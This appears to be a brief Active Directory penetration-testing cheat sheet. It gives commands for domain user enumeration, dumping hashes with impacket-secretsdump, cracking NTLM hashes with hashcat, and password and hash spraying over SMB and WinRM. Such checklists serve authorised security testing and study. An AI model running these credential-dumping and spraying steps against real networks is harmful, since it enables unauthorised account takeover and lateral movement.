# AD Pentesting Methodologies 

## PASSWORD ATTACKS, POST-EXPLOITATION AND PIVOTING EXAMPLE:

- Check C:\Users\ directory to add local users to a users.txt file (Post exploitation. Used for pivoting/lateral movement)

- net user /domain (Enumerate all domain users)

- impacket-secretsdump administrator@IP_ADDRESS (Dump hashes locally to our machine if we have admin access).

### Then

 - hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlist/rockyou.txt (Attempt to crack dumped hashes offline)

### Let’s say we have smb and winrm open. We will run it like this:

- Spray with continue on success users.txt and passwords.txt.

- Same as #1 but with local-auth

- Spray uncracked ntlm hashes to all users in users.txt (If we dumped them with secretsdump)

- Same as #3 but with local-auth
